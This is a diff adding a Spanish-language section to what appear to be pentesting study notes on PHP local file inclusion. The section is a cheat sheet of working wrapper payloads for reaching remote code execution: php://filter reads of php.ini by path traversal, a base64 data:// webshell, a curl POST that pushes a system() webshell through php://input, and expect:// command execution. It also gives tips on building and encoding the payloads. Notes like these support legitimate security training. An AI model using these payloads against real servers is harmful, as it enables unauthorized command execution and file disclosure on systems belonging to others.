@@ -127,4 +127,37 @@ Response.WriteFile(HttpContext.Request.Query['language']);
 > - **Ejecuta** → podés lograr RCE si controlás el contenido del archivo incluido
 > - **URL remota** → abre la puerta a RFI (incluir tu propio archivo malicioso desde tu server)
 
+
 ---
+
+# Wrappers
+
+| **Wrapper**    | **Requisito**                                               | **Sintaxis / Payload**                                       | **Método HTTP**         | **Ejemplo**                                                                                          |
+| -------------- | ----------------------------------------------------------- | ------------------------------------------------------------ | ----------------------- | ---------------------------------------------------------------------------------------------------- |
+| `php://filter` | Ninguno (lectura)                                           | `php://filter/read=convert.base64-encode/resource=<archivo>` | GET                     | `?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini` |
+| `data://`      | `allow_url_include=On`                                      | `data://text/plain;base64,<PHP_b64>` + `&cmd=<cmd>`          | GET                     | `?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id`       |
+| `php://input`  | `allow_url_include=On`, parámetro acepta POST               | `php://input` con webshell en el body                        | POST (body) + GET (cmd) | `curl -X POST --data '<?php system($_GET["cmd"]); ?>' "...?language=php://input&cmd=id"`             |
+| `expect://`    | Extensión `expect` instalada y cargada (`extension=expect`) | `expect://<comando>`                                         | GET                     | `?language=expect://id`                                                                              |
+
+**Verificaciones previas (vía LFI con `php://filter`)**
+
+| Qué chequear | Comando |
+|---|---|
+| Leer `php.ini` (Apache) | `/etc/php/X.Y/apache2/php.ini` |
+| Leer `php.ini` (Nginx/FPM) | `/etc/php/X.Y/fpm/php.ini` |
+| Confirmar `allow_url_include` | `… \| base64 -d \| grep allow_url_include` |
+| Confirmar `expect` | `… \| base64 -d \| grep expect` |
+
+**Webshell base para `data://` / `input`**
+
+```bash
+echo '<?php system($_GET["cmd"]); ?>' | base64
+# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
+```
+
+**Notas clave**
+- `allow_url_include` está **off por defecto** — sin él, `data://` y `php://input` no funcionan (y tampoco RFI).
+- `php://input` requiere que el parámetro vulnerable acepte POST; si solo acepta GET, no sirve.
+- Si la función usa solo `$_POST` (no `$_REQUEST`), meté el comando hardcodeado en el PHP: `<?php system('id'); ?>` en vez de webshell dinámica.
+- `expect://` está cargado en config ≠ funcional en runtime — siempre testealo con un `id`.
+- URL-encodear el payload base64: `=` → `%3D`, `+` → `%2B`.
